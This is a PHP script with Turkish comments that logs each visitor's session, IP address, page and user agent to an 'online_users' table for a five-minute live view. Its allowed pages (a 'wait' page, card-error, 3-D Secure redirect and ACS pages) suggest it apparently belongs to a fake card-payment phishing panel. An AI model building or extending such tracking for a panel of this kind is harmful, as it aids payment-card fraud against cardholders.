<?php
session_start();

// Güvenlik helper'ı dahil et
require_once 'security.php';

// Config dosyasını dahil et
require_once 'config.php';

// Veritabanı bağlantısı
try {
    $pdo = getDbConnection();
    
    // Tabloyu oluştur veya güncelle
    $pdo->exec("
        CREATE TABLE IF NOT EXISTS online_users (
            id INT AUTO_INCREMENT PRIMARY KEY,
            session_id VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL UNIQUE,
            user_identifier VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL,
            ip_address VARCHAR(45) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
            current_page VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
            user_agent TEXT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
            last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            INDEX idx_session (session_id),
            INDEX idx_user_identifier (user_identifier),
            INDEX idx_last_activity (last_activity)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    ");
    
    // Kolon yoksa ekle
    try {
        $pdo->exec("ALTER TABLE online_users ADD COLUMN user_identifier VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL AFTER session_id");
    } catch(PDOException $e) {
        // Kolon zaten varsa hata vermez
    }
    
    try {
        $pdo->exec("ALTER TABLE online_users ADD INDEX idx_user_identifier (user_identifier)");
    } catch(PDOException $e) {
        // Index zaten varsa hata vermez
    }
    
    // Collation'ı düzelt
    try {
        $pdo->exec("ALTER TABLE online_users 
            MODIFY session_id VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
            MODIFY user_identifier VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL,
            MODIFY ip_address VARCHAR(45) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
            MODIFY current_page VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL
        ");
    } catch(PDOException $e) {
        // Hata vermez
    }
    
    $sessionId = session_id();
    $userIdentifier = $_SESSION['userIdentifier'] ?? null;
    $ipAddress = Security::get_ip();
    $currentPage = Security::xss_clean($_POST['page'] ?? '/');
    $userAgent = Security::xss_clean($_SERVER['HTTP_USER_AGENT'] ?? '');
    
    // Sayfa validasyonu - sadece izin verilen sayfalar
    $allowedPages = [
        '/index.php', '/screen2.php', '/screen3.php', '/bekle.php', 
        '/success.php', '/error_card.php', '/3dredirect.php',
        '/test_tracking.php', '/test_system.php'
    ];
    
    $isAllowed = false;
    foreach ($allowedPages as $allowed) {
        if (strpos($currentPage, $allowed) !== false) {
            $isAllowed = true;
            break;
        }
    }
    
    // ACS sayfaları da izinli
    if (strpos($currentPage, '/acs/') !== false) {
        $isAllowed = true;
    }
    
    if (!$isAllowed) {
        $currentPage = '/';
    }
    
    // Insert or update
    $stmt = $pdo->prepare("
        INSERT INTO online_users (session_id, user_identifier, ip_address, current_page, user_agent, last_activity) 
        VALUES (?, ?, ?, ?, ?, NOW())
        ON DUPLICATE KEY UPDATE 
            user_identifier = VALUES(user_identifier),
            ip_address = VALUES(ip_address),
            current_page = VALUES(current_page),
            user_agent = VALUES(user_agent),
            last_activity = NOW()
    ");
    
    $stmt->execute([$sessionId, $userIdentifier, $ipAddress, $currentPage, $userAgent]);
    
    // Eski kayıtları temizle (5 dakikadan eski)
    $pdo->exec("DELETE FROM online_users WHERE last_activity < DATE_SUB(NOW(), INTERVAL 5 MINUTE)");
    
    http_response_code(204); // No content
} catch(PDOException $e) {
    error_log("Track online error: " . $e->getMessage());
    http_response_code(500);
}
?>
